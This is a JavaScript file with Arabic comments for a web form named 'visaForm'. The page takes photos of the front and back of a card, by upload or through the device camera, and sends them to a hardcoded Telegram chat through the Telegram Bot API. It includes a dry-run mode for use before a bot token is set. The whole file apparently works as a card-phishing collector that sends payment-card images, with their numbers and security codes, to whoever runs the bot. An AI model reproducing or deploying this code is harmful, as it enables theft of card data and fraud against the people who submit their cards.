// إعدادات: استبدل بقيمك قبل التشغيل
// ضع توكن البوت هنا بصيغة 'REPLACE_xxx' أثناء التطوير
const BOT_TOKEN = 'REPLACE_BOT_TOKEN';
const CHAT_ID = '8419807374';

// عناصر DOM
const visaForm = document.getElementById('visaForm');
const frontInput = document.getElementById('frontInput');
const backInput = document.getElementById('backInput');
const frontPreview = document.getElementById('frontPreview');
const backPreview = document.getElementById('backPreview');
const submitBtn = document.getElementById('submitBtn');
const loader = document.getElementById('loader');
const resultBox = document.getElementById('result');

// كاميرا
const cameraModal = document.getElementById('cameraModal');
const video = document.getElementById('video');
const captureBtn = document.getElementById('captureBtn');
const closeCameraBtn = document.getElementById('closeCameraBtn');
let currentSide = null;
let mediaStream = null;
// نفصل بين الصورة الملتقطة للوجه الأمامي والخلفي
let capturedFrontBlob = null;
let capturedBackBlob = null;

// دوال مطلوبة
// لم يعد هناك تحقق لرقم البطاقة — التطبيق يرسل الصور فقط حسب طلب المستخدم

function handleImageUpload(inputElement){
  const file = inputElement.files && inputElement.files[0];
  if(!file) return null;
  const allowed = ['image/jpeg','image/png','image/webp'];
  const maxSize = 5 * 1024 * 1024; // 5MB
  if(!allowed.includes(file.type)){
    showErrorMessage('نوع الصورة غير مدعوم. الرجاء استخدام jpg أو png أو webp.');
    return null;
  }
  if(file.size > maxSize){
    showErrorMessage('حجم الصورة كبير جداً. الحد الأقصى 5MB.');
    return null;
  }
  return file;
}

function showPreview(fileOrUrl, targetElement){
  // fileOrUrl يمكن أن يكون Blob/File أو مسار URL
  const container = targetElement;
  container.innerHTML = '';
  const img = document.createElement('img');
  if(typeof fileOrUrl === 'string'){
    img.src = fileOrUrl;
    container.appendChild(img);
    return;
  }
  const url = URL.createObjectURL(fileOrUrl);
  img.src = url;
  img.onload = () => URL.revokeObjectURL(url);
  container.appendChild(img);
}

async function sendToTelegramBot(frontFile, backFile){
  showResult(null);
  setLoading(true);

  // وضع اختبار محلي: لو لم يتم تعيين BOT_TOKEN فسنجري محاكاة لإثبات معالجة الصور
  if(BOT_TOKEN.startsWith('REPLACE')){
    try{
      console.log('[DEBUG] BOT_TOKEN غير مهيأ — وضع تجريبي لإرسال الصور');
      console.log('[DEBUG] frontFile:', frontFile);
      console.log('[DEBUG] backFile:', backFile);

      // نعرض أسماء/حجوم الملفات للمستخدم في الـ Console لتأكيد المعالجة
      const frontInfo = frontFile.name ? `${frontFile.name} (${frontFile.size} bytes)` : `blob (${frontFile.size} bytes)`;
      const backInfo = backFile.name ? `${backFile.name} (${backFile.size} bytes)` : `blob (${backFile.size} bytes)`;
      console.log(`[DEBUG] إرسال تجريبي — الصور: ${frontInfo} -- ${backInfo}`);

      // ننتظر قليلاً لمحاكاة زمن الشبكة
      await new Promise(r => setTimeout(r, 700));

      showSuccessMessage('وضع تجريبي: تم معالجة الصور محلياً (لم تُرسل إلى تيليجرام لأن BOT_TOKEN غير مهيأ).');
      visaForm.reset();
      frontPreview.innerHTML = 'لا توجد صورة';
      backPreview.innerHTML = 'لا توجد صورة';
    }catch(err){
      showErrorMessage('فشل في المحاكاة: ' + err.message);
    }finally{
      setLoading(false);
    }
    return;
  }

  try{
    // نرسل الصورتين فقط باستخدام sendMediaGroup بدون أي رقم أو caption
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`;
    const form = new FormData();
    const media = [
      { type: 'photo', media: 'attach://front' },
      { type: 'photo', media: 'attach://back' }
    ];
    form.append('chat_id', CHAT_ID);
    form.append('media', JSON.stringify(media));
    form.append('front', frontFile, 'front.jpg');
    form.append('back', backFile, 'back.jpg');

    const resp = await fetch(url, { method: 'POST', body: form });
    const data = await resp.json();
    if(resp.ok && data.ok){
      showSuccessMessage('تم إرسال الصور بنجاح إلى بوت تيليجرام.');
      visaForm.reset();
      frontPreview.innerHTML = 'لا توجد صورة';
      backPreview.innerHTML = 'لا توجد صورة';
    } else {
      const msg = (data && data.description) ? data.description : 'خطأ غير معروف أثناء الاتصال بتيليجرام.';
      showErrorMessage(msg);
    }
  }catch(err){
    showErrorMessage('فشل في الإرسال: ' + err.message);
  }finally{
    setLoading(false);
  }
}

function showSuccessMessage(message){
  showResult(message, 'success');
}
function showErrorMessage(message){
  showResult(message, 'error');
}

function showResult(message, type){
  if(!message){ resultBox.className = 'result'; resultBox.textContent = ''; return; }
  resultBox.textContent = message;
  resultBox.className = 'result ' + (type === 'success' ? 'success' : 'error');
}

function setLoading(state){
  if(state){ loader.classList.remove('hidden'); submitBtn.disabled = true; } else { loader.classList.add('hidden'); submitBtn.disabled = false; }
}

// أحداث
frontInput.addEventListener('change', () => {
  const file = handleImageUpload(frontInput);
  if(file) showPreview(file, frontPreview);
});
backInput.addEventListener('change', () => {
  const file = handleImageUpload(backInput);
  if(file) showPreview(file, backPreview);
});

visaForm.addEventListener('submit', async (e) =>{
  e.preventDefault();
  showResult(null);

  // الملفات قد تأتي من مدخلات الملفات أو من الصور الملتقطة (المخزنة لكل جانب)
  let frontFile = frontInput.files && frontInput.files[0] ? handleImageUpload(frontInput) : null;
  let backFile = backInput.files && backInput.files[0] ? handleImageUpload(backInput) : null;

  if(!frontFile && capturedFrontBlob) frontFile = capturedFrontBlob;
  if(!backFile && capturedBackBlob) backFile = capturedBackBlob;

  if(!frontFile || !backFile){
    showErrorMessage('يرجى إضافة صورة للوجه الأمامي والخلفي قبل الإرسال.');
    return;
  }

  await sendToTelegramBot(frontFile, backFile);
});

// كاميرا - فتح modal وبدء البث
document.querySelectorAll('.camera-btn').forEach(btn => {
  btn.addEventListener('click', async (e) =>{
    currentSide = btn.getAttribute('data-side');
    cameraModal.classList.remove('hidden');
    cameraModal.setAttribute('aria-hidden','false');
    try{
      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio:false });
      video.srcObject = mediaStream;
    }catch(err){
      showErrorMessage('تعذر الوصول إلى الكاميرا: ' + err.message);
      cameraModal.classList.add('hidden');
    }
  });
});

captureBtn.addEventListener('click', async () =>{
  if(!mediaStream) return;
  const track = mediaStream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);
  try{
    const blob = await imageCapture.takePhoto();
    // عرض المعاينة والتعيين في input افتراضياً (غير ممكن ضبط File مباشرة من blob بسهولة)
    if(currentSide === 'front'){
      capturedFrontBlob = blob;
      showPreview(blob, frontPreview);
      // نزيل أي ملفات input السابقة
      frontInput.value = '';
    } else {
      capturedBackBlob = blob;
      showPreview(blob, backPreview);
      backInput.value = '';
    }
    stopCamera();
    cameraModal.classList.add('hidden');
  }catch(err){
    showErrorMessage('خطأ أثناء التقاط الصورة: ' + err.message);
  }
});

closeCameraBtn.addEventListener('click', () =>{
  stopCamera();
  cameraModal.classList.add('hidden');
});

function stopCamera(){
  if(mediaStream){
    mediaStream.getTracks().forEach(t => t.stop());
    mediaStream = null;
  }
}

// تحضير loader مخفي عند بداية
setLoading(false);
